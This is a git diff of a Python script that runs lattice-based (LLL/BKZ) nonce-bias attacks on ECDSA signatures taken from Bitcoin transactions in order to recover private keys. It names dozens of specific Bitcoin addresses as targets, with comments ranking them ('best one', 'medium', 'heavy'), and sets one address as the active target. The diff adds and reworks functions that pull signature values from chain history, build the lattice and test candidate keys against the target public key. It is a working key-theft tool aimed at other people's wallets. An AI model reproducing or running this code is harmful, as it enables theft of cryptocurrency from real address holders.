@@ -929,84 +929,7 @@ def solve_hybrid_anchor(signatures, target_address):
                             return hex(t_cand)
     return False
 
-def solve_msb_lattice(signatures, target_address):
-    m = len(signatures)
-    print(f"[*] [10:43 AM] INITIALIZING V15.1 HYBRID ANCHOR PROTOCOL...")
-    print(f"[*] Analyzing {m} biased inputs with 512-bit precision...")
 
-    # We test the dominant 0x47 bias (1-bit) and the anchor 0x46 (9-bit)
-    for bias_bits in [9, 8,  7,6,5, 4, 3]: 
-        B = 2**(256 - bias_bits)
-        scale = N // B
-        # L = Matrix(QQ, m + 2, m + 2)
-        L = IntegerMatrix(m + 2, m + 2)
-        normalized_sigs = []
-        
-        for i, sig in enumerate(signatures):
-            z, r, s_raw = int(sig['z'], 16), int(sig['r'], 16), int(sig['s'], 16)
-            # Normalizing S for 2012 malleability
-            # s = s_raw if s_raw <= N // 2 else N - s_raw
-            s = s_raw
-            normalized_sigs.append((z,r,s))
-            s_inv = pow(s, -1, N)
-            t_i = (r * s_inv) % N
-            u_i = (z * s_inv) % N # Known prefix is 0
-            
-            # WEIGHTING: Assign 512x importance to the 0x46 signature
-            
-            L[i, i] = N * scale
-            L[m, i] = t_i * scale
-            L[m + 1, i] = (u_i - (B // 2)) * scale
-            
-        L[m, m] = 1
-        L[m + 1, m + 1] = B // 2
-
-        # A = IntegerMatrix.from_matrix(L.change_ring(ZZ))
-        FPLLL.set_precision(256)
-        gso = GSO.Mat(L, float_type="mpfr")
-        gso.update_gso()
-        
-        # BKZ-40 is sufficient for this dimension (27) given the high bias
-        BKZ.Reduction(gso, LLL.Reduction(gso), BKZ.Param(block_size=40, flags=BKZ.VERBOSE))()
-
-        for row in L:
-            cand = abs(int(row[m])) % N
-            if cand > 1:
-                for drift in range(-300, 310):
-                    if verify_all_standards(cand + drift, target_address):
-                        print(f"\n[!!!] SNIPER SUCCESS: {hex(cand + drift)}")
-                        print(f"\n[!!!] SNIPER SUCCESS:")
-                        return hex(cand + drift)
-            cand = abs(int(row[m+1])) % N
-            if cand > 1:
-                for drift in range(-300, 310):
-                    if verify_all_standards(cand + drift, target_address):
-                        print(f"\n[!!!] SNIPER SUCCESS: {hex(cand + drift)}")
-                        print(f"\n[!!!] SNIPER SUCCESS:")
-                        return hex(cand + drift)
-            for i in range(m):
-                k_base = abs(int(row[i])) % N
-                if k_base <= 1: continue
-                
-                z, r, s = normalized_sigs[i]
-                r_inv = pow(r, -1, N)
-                
-                # Test the standard 4 variants for 2015 recovery
-                for drift in range(-300, 301):
-                    k_cand = (k_base + drift) % N
-                    d_candidates = [
-                        (s * k_cand - z) * r_inv % N,
-                        (s * k_cand + z) * r_inv % N,
-                        (s * (N - k_cand) - z) * r_inv % N,
-                        (s * (N - k_cand) + z) * r_inv % N,
-                        k_cand
-                    ]
-                    for t_cand in d_candidates:
-                        if verify_all_standards(t_cand, target_address):
-                            print(f"\n[!!!] EVENT HORIZON SUCCESS: {hex(t_cand)}")
-                            print(f"\n[!!!] SNIPER SUCCESS:")
-                            return hex(t_cand)
-    return False
 
 def solve_recovery_perfected_v5(signatures, target_address):
     """
@@ -1275,7 +1198,11 @@ def verify_fast(cand_d, target_pubkey_bytes):
         if cand_d <= 0 or cand_d >= N: return False
         # Direct ECC derivation and byte comparison (No hashing)
         pk_bytes = coincurve.PublicKey.from_secret(cand_d.to_bytes(32, 'big')).format(compressed=False)
-        return pk_bytes == target_pubkey_bytes
+        pk_hex = pk_bytes.hex()
+        # print(pk_hex)
+        # print(target_pubkey_bytes)
+        # return pk_bytes == target_pubkey_bytes
+        return pk_hex == target_pubkey_bytes
     except Exception as e:
         print(str(e))
         return False
@@ -1628,18 +1555,7 @@ def run_surgical_recovery(signatures, target_pubkey_hex):
                         time.sleep(0.1)
     return None
 
-def get_words():
-    wordsList = []
-    if wordsList == []:
-        content_string = ""
-        # with open("test.txt", "r") as f:
-        with open("hkm-123456.txt", "r") as f:
-        # with open("123456.txt", "r") as f:
-            content_string = f.read()
-        # print(content_string)
-        wordsList = content_string.split("\n")
-        
-    return wordsList
+
 
 def run_v9_2_sprint(signatures, target_pubkey_hex):
     """
@@ -1734,283 +1650,259 @@ def run_v9_2_sprint(signatures, target_pubkey_hex):
     print("[*] Sprint complete. High-signal zone exhausted.")
     return None
 
+def compare_Bias(cand):
+    hex_result = hex(cand)[2:].zfill(64)
+    # print(f"Hex Result: {hex_result}")
+    return len(hex_result)-len(hex_result.lstrip('0'))
 
+def solve_msb_lattice(signatures, target_pubkey):
+    m = len(signatures)
+    print(f"[*] [10:43 AM] INITIALIZING V15.1 HYBRID ANCHOR PROTOCOL...")
+    print(f"[*] Analyzing {m} biased inputs with 512-bit precision...")
 
-def analyze_r_values(r_values):
-    cleaned = [r.lower().replace("0x", "").zfill(64) for r in r_values]
-    nums = [int(r, 16) for r in cleaned]
-
-    print("Total r values:", len(cleaned))
-    print("Duplicate r count:", len(cleaned) - len(set(cleaned)))
-
-    bit_lengths = [n.bit_length() for n in nums]
-    leading_bytes = [r[:2] for r in cleaned]
-    msb_set = sum(1 for r in cleaned if int(r[:2], 16) >= 0x80)
-    leading_zero_bytes = [len(r) - len(r.lstrip("0")) for r in cleaned]
-
-    print("\nBit length distribution:")
-    for k, v in sorted(Counter(bit_lengths).items()):
-        print(k, v)
-
-    print("\nLeading byte distribution:")
-    for k, v in sorted(Counter(leading_bytes).items()):
-        print(k, v)
-
-    print("\nMSB set count:")
-    print(msb_set, "/", len(cleaned))
-
-    print("\nLeading hex zero count:")
-    for k, v in sorted(Counter(leading_zero_bytes).items()):
-        print(k, v)
-
-    print("\nSmall-r candidates:")
-    for r in cleaned:
-        if int(r[:2], 16) < 0x10:
-            print(r)
-
-def check_der_signature(sig_hex):
-    sig = bytes.fromhex(sig_hex)
-
-    if len(sig) < 9:
-        return False, "Too short"
-
-    sighash = sig[-1]
-    der = sig[:-1]
-
-    if der[0] != 0x30:
-        return False, "Not DER sequence"
-
-    if der[1] != len(der) - 2:
-        return False, "Wrong total length"
-
-    if der[2] != 0x02:
-        return False, "Missing r integer marker"
-
-    r_len = der[3]
-    r_start = 4
-    r_end = r_start + r_len
-
-    if r_len == 0:
-        return False, "Zero-length r"
-
-    if r_end >= len(der):
-        return False, "r length out of range"
-
-    r = der[r_start:r_end]
-
-    if der[r_end] != 0x02:
-        return False, "Missing s integer marker"
-
-    s_len = der[r_end + 1]
-    s_start = r_end + 2
-    s_end = s_start + s_len
-
-    if s_len == 0:
-        return False, "Zero-length s"
-
-    if s_end != len(der):
-        return False, "Wrong s length"
-
-    s = der[s_start:s_end]
-
-    def check_int(x, name):
-        if x[0] & 0x80:
-            return False, f"{name} is negative"
-        if len(x) > 1 and x[0] == 0x00 and not (x[1] & 0x80):
-            return False, f"{name} has unnecessary leading zero"
-        return True, "ok"
-
-    ok, reason = check_int(r, "r")
-    if not ok:
-        return False, reason
-
-    ok, reason = check_int(s, "s")
-    if not ok:
-        return False, reason
-
-    return True, {
-        "sighash": hex(sighash),
-        "r_len": r_len,
-        "s_len": s_len,
-        "r": r.hex(),
-        "s": s.hex()
-    }
-
-def make_report(address):
-    result = []
-    totalCnt = 0
-    allHistory = get_full_history(address)
-    result, r_du, totalCnt = extract_rsz_data(allHistory, address)
-
-    # words = get_words()
-    # for word in words:
-    #     result.append(json.loads(word))
+    # We test the dominant 0x47 bias (1-bit) and the anchor 0x46 (9-bit)
+    # for bias_bits in [9, 8,  7,6,5, 4, 3]: 
+    for bias_bits in [128]: 
+        B = 2**(256 - bias_bits)
+        scale = N // B
+        # L = Matrix(QQ, m + 2, m + 2)
+        L = IntegerMatrix(m + 2, m + 2)
+        normalized_sigs = []
         
-    # result = result[:38]
-    pat = address[1:5]
-
-    verfiedCnt = 0
-    top45List = []
-    top46List = []
-    good47List = []
-    bigScnt = 0
-    totalBias =0
-    pubkey = ""
-    pubkey_byte = ""
-    for entity in result:
-        res = verify_sig_integrity(entity['r'], entity['s'], entity['z'], entity['pubkey'])
-        if res:
-            # print(entity)
-            pubkey = entity['pubkey']
-            bias = get_bias_bits(entity['r'])
-            totalBias += bias
-            verfiedCnt += 1
-
-            tx_data = call_cli(["getrawtransaction", entity['txid'], "true"])
-            tx_time = (tx_data['blocktime'])
-
-            tx_blockhash = (tx_data['blockhash'])
-            block_data = call_cli(["getblock", tx_blockhash])
-            tx_index = block_data["tx"].index(entity['txid'])
-            # print(tx_time)
+        for i, sig in enumerate(signatures):
+            z, r, s_raw = int(sig['z'], 16), int(sig['r'], 16), int(sig['s'], 16)
+            # Normalizing S for 2012 malleability
+            # s = s_raw if s_raw <= N // 2 else N - s_raw
+            s = s_raw
+            normalized_sigs.append((z,r,s))
+            s_inv = pow(s, -1, N)
+            t_i = (r * s_inv) % N
+            u_i = (z * s_inv) % N # Known prefix is 0
             
-            with open(f"./report/{pat}-total-1.txt", "a") as file:
-                final_res = entity
-                final_res['blocktime'] = tx_time
-                final_res['tx_index'] = tx_index
-                file.write(json.dumps(final_res)+'\n')
-                # file.write(json.dumps(entity)+'\n')
+            
+            
+            L[i, i] = N * scale
+            L[m, i] = t_i * scale
+            L[m + 1, i] = (u_i - (B // 2)) * scale
+            # L[m + 1, i] = (u_i) * scale
+            
+        L[m, m] = 1
+        L[m + 1, m + 1] = B // 2 #not center : 1
+        # L[m + 1, m + 1] = 1 #not center : 1
+   
+        # A = IntegerMatrix.from_matrix(L.change_ring(ZZ))
+        FPLLL.set_precision(1024)
+        gso = GSO.Mat(L, float_type="mpfr")
+        gso.update_gso()
+        
+        # BKZ-40 is sufficient for this dimension (27) given the high bias
+        BKZ.Reduction(gso, LLL.Reduction(gso), BKZ.Param(block_size=200, flags=BKZ.VERBOSE))()
+        print(L[0][m])
+        # return
+        for idx, row in enumerate(L):
+            for i in range(0, len(row)):
+                val  = abs(int(row[i])) % N
+                if val <= 0 or val >= N:
+                    continue
+                # print(val)
+                
 
-        # print(res)
-    print(bigScnt)
-    print(totalBias)
-    print(len(result))
-    for i in range(0, len(result)):
-        for j in range(0, len(result)):
-            if int(result[i]['r'], 16) < int(result[j]['r'], 16):
-                temp = result[i]
-                result[i] = result[j]
-                result[j] = temp
-    print(len(result), "-", verfiedCnt, "-", totalCnt)
-    print(pubkey)
-    pubkey_byte = bytes.fromhex(pubkey)
-    print(pubkey_byte)
+                val_offest = abs(int(row[i]) + (B // 2)) % N
+                val_offest1 = abs(int(row[i]) - (B // 2)) % N
+                for k_cand in [val, val_offest, val_offest1]:
+                # for k_cand in [val]:
+                    candidates = [
+                        # (s * k_cand - z) * r_inv % N,
+                        # (s * k_cand + z) * r_inv % N,
+                        # (s * (N - k_cand) - z) * r_inv % N,
+                        # (s * (N - k_cand) + z) * r_inv % N,
+                        k_cand,
+                        (N - k_cand) % N
+                    ]
+                    
+                    for cand in candidates:
+                        if cand == 0 or cand == N:
+                            continue
+                        if compare_Bias(cand) >= 0:
+                            # print("Good")
+                            # print(compare_Bias(cand))
+                            # print(row[i])
+                            # print(cand,' ', i, ' ', idx)
+                            if i < m:
+                                z, r, s = normalized_sigs[i]
+                                r_inv = pow(r, -1, N)
+                                cands = [
+                                    (s * cand - z) * r_inv % N,
+                                    (s * cand + z) * r_inv % N,
+                                    (s * (N - cand) - z) * r_inv % N,
+                                    (s * (N - cand) + z) * r_inv % N,
+                                    cand,
+                                    (N - cand) % N
+                                ]
+                                for cand_d in cands:
+                                    if verify_fast(cand_d, target_pubkey):
+                                        print("Good!")
+                                        return
+                        # continue
+                        if verify_fast(cand, target_pubkey):
+                            print("Good")
+                            return
 
-    for entity in result:
-        with open(f"./report/{pat}-total-2.txt", "a") as file:
-            final_res = entity
-            file.write(json.dumps(final_res)+'\n')
-            # file.write(json.dumps(entity)+'\n')
-    result.sort(
-        key=lambda x: (
-            x["block_height"],
-            x["tx_index"],
-            x.get("vid", 0)
-        )
-    )
-    for entity in result:
-        with open(f"./report/{pat}-total-3.txt", "a") as file:
-            final_res = entity
-            file.write(json.dumps(final_res)+'\n')
+        # print(L)
+    #     for row in L:
+    #         cand = abs(int(row[m])) % N
+    #         if cand > 1:
+    #             for drift in range(-300, 310):
+    #                 if verify_all_standards(cand + drift, target_address):
+    #                     print(f"\n[!!!] SNIPER SUCCESS: {hex(cand + drift)}")
+    #                     print(f"\n[!!!] SNIPER SUCCESS:")
+    #                     return hex(cand + drift)
+    #         cand = abs(int(row[m+1])) % N
+    #         if cand > 1:
+    #             for drift in range(-300, 310):
+    #                 if verify_all_standards(cand + drift, target_address):
+    #                     print(f"\n[!!!] SNIPER SUCCESS: {hex(cand + drift)}")
+    #                     print(f"\n[!!!] SNIPER SUCCESS:")
+    #                     return hex(cand + drift)
+    #         for i in range(m):
+    #             k_base = abs(int(row[i])) % N
+    #             if k_base <= 1: continue
+                
+    #             z, r, s = normalized_sigs[i]
+    #             r_inv = pow(r, -1, N)
+                
+    #             # Test the standard 4 variants for 2015 recovery
+    #             for drift in range(-300, 301):
+    #                 k_cand = (k_base + drift) % N
+    #                 d_candidates = [
+    #                     (s * k_cand - z) * r_inv % N,
+    #                     (s * k_cand + z) * r_inv % N,
+    #                     (s * (N - k_cand) - z) * r_inv % N,
+    #                     (s * (N - k_cand) + z) * r_inv % N,
+    #                     k_cand
+    #                 ]
+    #                 for t_cand in d_candidates:
+    #                     if verify_all_standards(t_cand, target_address):
+    #                         print(f"\n[!!!] EVENT HORIZON SUCCESS: {hex(t_cand)}")
+    #                         print(f"\n[!!!] SNIPER SUCCESS:")
+    #                         return hex(t_cand)
+    # return False
 
-def get_addresses():
+def get_t_u(sig):
+    z, r, s = int(sig['z'], 16), int(sig['r'], 16), int(sig['s'], 16)
+    s_inv = pow(s, -1, N)
+    t_i = (r * s_inv) % N
+    u_i = (z * s_inv) % N # Known prefix is 0
+    return (t_i, u_i)
+
+
+def estimate_nonce_bias_multi(signatures_subset, q=0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141):
+    """
+    Analyzes a block of multiple signatures simultaneously to find the bit bias.
+    Expects 'signatures_subset' to be a list of 5 to 15 tuples: [(t_0, u_0), (t_1, u_1), ...]
+    """
+    m = len(signatures_subset)
+    if m < 3:
+        print("[-] Error: You need at least 5-15 signatures to break the 2^128 floor.")
+        return None
+
+    print(f"[*] Analyzing {m} signatures simultaneously...")
+    print("-" * 75)
+    print(f"{'Tested Bias':<15}{'Target Bound':<20}{'Discovered Delta':<20}{'Status'}")
+    print("-" * 75)
+
+    best_match_bits = None
+    dim = m + 1 # Dimension of the system
+
+    # Loop through the hypothetical bit biases
+    for test_bias_bits in range(4, 256, 4):
+        bound = 2**(256 - test_bias_bits)
+        
+        # Build an (m + 1) x (m + 1) matrix for the modern HNP framework
+        # This relates all signatures back to the single secret key 'x'
+        M = Matrix(ZZ, dim, dim)
+        
+        # 1. Set the diagonal modular operators (excluding the last two cells)
+        for i in range(m - 1):
+            M[i, i] = q
+            
+        # 2. Construct the relational rows using a common baseline (index 0)
+        # This cancels out the private key 'x' across the signature pool
+        t0, u0 = get_t_u(signatures_subset[0])
+        inv_t0 = int(pow(t0, -1, q))
+        
+        for i in range(1, m):
+            ti, ui = get_t_u(signatures_subset[i])
+            
+            # Compute the multi-transaction multipliers and offsets
+            A_i = (ti * inv_t0) % q
+            C_i = (ui - u0 * A_i) % q
+            
+            M[i - 1, i - 1] = q
+            M[m - 1, i - 1] = A_i
+            M[m, i - 1] = C_i
+
+        # 3. Add the structural scaling anchors to the matrix corners
+        M[m - 1, m - 1] = 1
+        M[m, m] = bound
+
+        # Execute LLL reduction on the multi-signature lattice
+        reduced_M = M.LLL()
+        
+        # Look for the row containing our boundary scalar anchor
+        for row in reduced_M:
+            if abs(row[-2]) == bound:
+                # Extract all corresponding nonce deltas across the signature block
+                deltas = [abs(int(x)) for x in row[:-1] if x != 0]
+                
+                if deltas:
+                    max_delta = max(deltas)
+                    
+                    # If there's a real bias, max_delta will break below the 2^128 threshold
+                    if max_delta < bound and max_delta.bit_length() < 120:
+                        status = "⚠️ MATCH FOUND"
+                        best_match_bits = test_bias_bits
+                    else:
+                        status = "Random Noise"
+                        
+                    print(f"Top {test_bias_bits:<2} bits     2^{256 - test_bias_bits:<17} 2^{max_delta.bit_length():<17} {status}")
+                break
+            else:
+                print(f"Top {test_bias_bits:<2} bits     2^{256 - test_bias_bits:<17} Optimization Miss   Skipped")
+
+    print("-" * 75)
+    return best_match_bits
+
+
+
+
+def get_words():
     wordsList = []
     if wordsList == []:
         content_string = ""
-        # with open("test.txt", "r") as f:
-        with open("2013.txt", "r") as f:
-        # with open("123456.txt", "r") as f:
+        
+        with open("./report/CTUU-total-3.txt", "r") as f:
+        # with open("./report/FdPp-total-2.txt", "r") as f:
             content_string = f.read()
-        # print(content_string)
+        
         wordsList = content_string.split("\n")
         
     return wordsList
                    
 if __name__ == "__main__":
-    # addresses = get_addresses()
-    # id = 0
-    # for content in addresses:
-    #     if not content:
-    #         continue
-    #     if id < 10:
-    #         continue
-    #     else:
-    #         addr = content.split(",")[0]
-    #         print(addr)
-    #         make_report(addr)
-    #         time.sleep(200)
-    #     id+=1
-    
-    
-    # Example:
-    # address= "1NibfhHfgA857dtG6pB25Y5hDcxpDo2J47"
-    # address = "1EpbMFnnpCi6QjQCJMhkKdJyatwDjeoYmA"
-    # address = "1FgiDfz7jmdjTUaJ9GsKbNbgsmu7T31Dvx"
-    # address = "1JfzVxMddF91a4oqhZYsSZ4tmpRXfWvKeY"
-    # address = "1A8mhLMd1meWZbLvbKCzpta5rC9tnV5v5Z"
-    # address = "1nn1Z3NAJzT2mc6rDL11K4AhhpKgrCftP"
-    # address = "1KaW2Fe3hjx3G5M21oiZJzThqfR5pkvp4X"
-
-    # address = "15ZV6KuHbkoX8BWWi61FP2ngry7Y7K6HJS"
-
-    # address = "1BezrM7zLYP9R4MwUHdHt89Va8pdYvpv3Y" #best one
-    # address = "1BowP9AXuMTjiiR1u1AJjUwMNuRaZP9BSp" #best one
-    # address = "1B3HC7Gft6Fnh4EVsA2DrRdXrWZA1oHELR" #candidate
-
     address = "1CTUU9ezF4FJ3iBWzzuhndFUKokJ39wupA"
-
-
-    # address = "1HKm9u2VcKP23AEUQRcPcjAyR4NSda97kC"
-
-    # address = "1AV4KGCsvtPZ9tG7hvwgb85wJyFd9xdpFv"
-    # address = "16mCkMt1Z4ZSaKZNitk2PcP1MyW19wHiQ8" #heavy
-    # address = "1FkFFs5QuFqqGgUovo6HN7SR2LSiUPK8Eh" #medium
-    # address = "1PTw9KreduwbaJrydHnXTYKTGMRM9cQygT" ///
-    # address = "19GP1D3BPe8K8uvbTaqxLzXPyBFj9GhHrL" #medium
-    # address = "1FoLjGcHFekHWcXxcja6C7SKNGNVc3rYZH"
-    # address = "1JWCPRUrtLWadbuMfe7iBSRV1WS6xkS2VZ" #medium
-    # address = "16mCkMt1Z4ZSaKZNitk2PcP1MyW19wHiQ8" ///
-    # address = "1Mf4SBdgeHWP6X7sJyR5T6GG3G9johrZF9"
-    # address = "1JHwt6ArhujJmgDKPtSmGkMmSAPyAhVptL"
-    # address = "1A4S96oNLQr9pp9iVRAhsyjEBEVp5hrFnu"
-    # address = "1DMe8xchq6ChFcuJRz9EodHWjmR6ckofqq"
-    # address = "13iTiSbLV87stuje9TVGVE2txyWyfmvjh8" #medium
-    # address = "1BVNys6B5v8yeWMZxT1RJWgrcuArikYgA1" #
-    # address = "1Hr6WhNgciytH3RwTy28q2tbm2JNBzuDm2" #medium
-    # address = "1CiXtqcniX6acNEM4SK89sBrKYskeoWmat"
-    # address = "15VyBbVPPrvPy8KziccchLkJRF4eF2Pmid" #
-    # address = "1B7zVbm1CSsxcJj49QAppaAG9zKnKfA46y"
-    # address = "14opZdXZSQWFTvQabCJyVADahZSxhbWsTR" #
-    # address = "13FfGqvz8tqqjYreg9czoNLQf32H34NGJN"
-    # address = "13YVUnJLHHDVPuzpoziQFS7JgtCNDJy5CM"
-    # address = "15RsDbyJkZHCqNGftni1Umau5DmfDbExEW" #
-    # address = "181KoGwpDNNEVvWyEvHpM2SLWQDXwLvofS" #good
-    # address = "15ubYU8d11bW4fZnh5A2JG2vD83eavgxNk"
-    # address = "1GUkF7D5sKvYSk7ZnoFsmMoW2KhEFfmdWv" #
-    # address = "1KeqdkJNHhDfs2XkNvE9g1VtwbHUsNTUqv" #best good
-    # address = "12zT5wCcBLVRVdpQFqfT66drf39YDTabMW"
-    # address = "13JVVCB8qJKJiwDmy7WWtHfs6eQfg9WmD2"
-    # address = "1BTCorgHwCg6u2YSAWKgS17qUad6kHmtQW"
-    # address = "1YvCWqSpARRY7tyguMaPXHD9GCRyc74Hh" #heavy
-    # address = "1AzRkXiGpHbXyWok4uXvCzmezDuW8FGa3m" #?
-    # address = "1FcMK7cgm9yFTx1haVF6Betcr6NyV8Ty2i"
-
-    
-
-    # address = "16fXTTLZRft6eWb32zSihvGXSgZ6QmDQBB"
-    # report = detect_vulnerable_software(address)
-    # print(report)
-
     pat = address[1:5]
     
     result = []
     totalCnt = 0
-    allHistory = get_full_history(address)
-    result, r_du, totalCnt = extract_rsz_data(allHistory, address)
+    # allHistory = get_full_history(address)
+    # result, r_du, totalCnt = extract_rsz_data(allHistory, address)
 
-    # words = get_words()
-    # for word in words:
-    #     result.append(json.loads(word))
+    words = get_words()
+    for word in words:
+        if not word:
+            continue
+        result.append(json.loads(word))
         
     # result = result[:38]
 
@@ -2037,82 +1929,34 @@ if __name__ == "__main__":
             tx_blockhash = (tx_data['blockhash'])
             block_data = call_cli(["getblock", tx_blockhash])
             tx_index = block_data["tx"].index(entity['txid'])
-            # print(tx_time)
-            
-            with open(f"./report/{pat}-total-1.txt", "a") as file:
-                final_res = entity
-                final_res['blocktime'] = tx_time
-                final_res['tx_index'] = tx_index
-                file.write(json.dumps(final_res)+'\n')
-                # file.write(json.dumps(entity)+'\n')
 
-        # print(res)
     print(bigScnt)
     print(totalBias)
     print(len(result))
-    for i in range(0, len(result)):
-        for j in range(0, len(result)):
-            if int(result[i]['r'], 16) < int(result[j]['r'], 16):
-                temp = result[i]
-                result[i] = result[j]
-                result[j] = temp
+    # for i in range(0, len(result)):
+    #     for j in range(0, len(result)):
+    #         if int(result[i]['r'], 16) < int(result[j]['r'], 16):
+    #             temp = result[i]
+    #             result[i] = result[j]
+    #             result[j] = temp
     print(len(result), "-", verfiedCnt, "-", totalCnt)
     print(pubkey)
     pubkey_byte = bytes.fromhex(pubkey)
     print(pubkey_byte)
 
-    for entity in result:
-        with open(f"./report/{pat}-total-2.txt", "a") as file:
-            final_res = entity
-            file.write(json.dumps(final_res)+'\n')
-            # file.write(json.dumps(entity)+'\n')
-    result.sort(
-        key=lambda x: (
-            x["block_height"],
-            x["tx_index"],
-            x.get("vid", 0)
-        )
-    )
-    for entity in result:
-        with open(f"./report/{pat}-total-3.txt", "a") as file:
-            final_res = entity
-            file.write(json.dumps(final_res)+'\n')
-
-    # chs_result = []
-    # dup_txs = []
-    # for entity in result:
-    #     if entity['txid'] not in dup_txs:
-    #         dup_txs.append(entity['txid'])
-    #         chs_result.append(entity)
-    #         # print(en)
-    # #         # with open("12345.txt", "a") as file:
-    # #         #     file.write(json.dumps(entity)+'\n')
-
-    # dup_times = []
-    # for entity in chs_result:
-        # tx_data = call_cli(["getrawtransaction", entity['txid'], "true"])
-        # tx_time = (tx_data['blocktime'])
-        # print(tx_time)
-        # if tx_time not in dup_times:
-        #     dup_times.append(tx_time)
-        #     # chs_result.append(entity)
-        #     with open("hkm-123456.txt", "a") as file:
-        #         final_res = entity
-        #         final_res['blocktime'] = tx_time
-        #         file.write(json.dumps(final_res)+'\n')
-
-
-    # print(len(r_du))
-    # for entity in result:
-    #     with open("123.txt", "a") as file:
-    #         file.write(json.dumps(entity)+'\n')
-    #     print(entity['r'])
-        # print(int(entity['r'], 16)%2)
-    
+    # result.sort(
+    #     key=lambda x: (
+    #         x["block_height"],
+    #         x["tx_index"],
+    #         x.get("vid", 0)
+    #     )
+    # )
+    # print(estimate_nonce_bias_multi(result[12:40]))
+   
     # res = solve_event_horizon(result, address)
-    # res = solve_msb_lattice(result[0:59], address)
+    res = solve_msb_lattice(result[11:28], pubkey)
     # print(res)
-
+            
     # res = solve_recovery_perfected_v5(result[0:59], address)
     # res = solve_hnp_final_2012(result, address)
     # res = solve_54_signatures_turbo(result, address)
